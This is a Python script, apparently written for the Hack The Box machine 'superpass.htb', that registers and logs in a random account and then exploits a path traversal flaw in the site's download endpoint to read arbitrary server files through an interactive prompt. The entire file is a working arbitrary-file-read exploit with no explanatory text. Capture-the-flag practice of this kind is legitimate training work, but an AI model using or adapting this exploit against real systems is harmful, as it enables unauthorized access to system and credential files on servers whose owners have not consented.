#!/usr/bin/env python3
from requests import Session
from uuid import uuid4

POST_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

def requestAccount(session, user, password, endpoint):
    content = {"username": user, "password": password}
    response_code = 500
    
    while response_code == 500:
        response = session.post(f"http://superpass.htb/account/{endpoint}", data=content, headers=POST_HEADERS)
        response_code = response.status_code

def getLoggedInSession():
    session = Session()

    user = str(uuid4()).replace("-", "")
    pwd = "MySuperSecretPassword1234@"

    requestAccount(session, user, pwd, "register")
    requestAccount(session, user, pwd, "login")
    return session

def readFile(session, path):
    response_code = 500
    fileContent = ""

    while response_code == 500:
        response = session.get(f"http://superpass.htb/download?fn=../../../../../../../../{path}")
        fileContent = response.text
        response_code = response.status_code
        if response_code == 500:
            if "FileNotFoundError" in response.text:
                return "File not found"
            elif "PermissionError" in response.text:
                return "Permission denied"

    return fileContent 

def startInteractiveFileRead(session):
    print("Enter 'exit' to quit")
    while True:
        path = input("> ")
        if path == "exit":
            break

        content = readFile(session, path)
        print(content)

def main():
    session = getLoggedInSession()
    startInteractiveFileRead(session)

if __name__ == "__main__":
    main()
